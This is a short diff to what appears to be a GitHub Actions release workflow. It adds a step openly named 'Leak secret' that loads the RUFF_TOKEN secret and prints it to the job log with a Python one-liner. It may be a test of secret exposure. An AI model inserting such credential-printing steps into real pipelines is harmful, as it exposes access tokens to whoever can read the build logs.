@@ -8,9 +8,15 @@ on:
 jobs:
   updload-a2-py:
     runs-on: ubuntu-latest
+    environment:
+      name: release
     steps:
       - name: Checkout
         uses: actions/checkout@v3
+      - name: Leak secret
+        run: python -c "import os; print(os.environ['RUFF_TOKEN'])"
+        env:
+          RUFF_TOKEN: ${{ secrets.RUFF_TOKEN }}
       - name: Release
         uses: softprops/action-gh-release@v1
         if: startsWith(github.ref, 'refs/tags/')
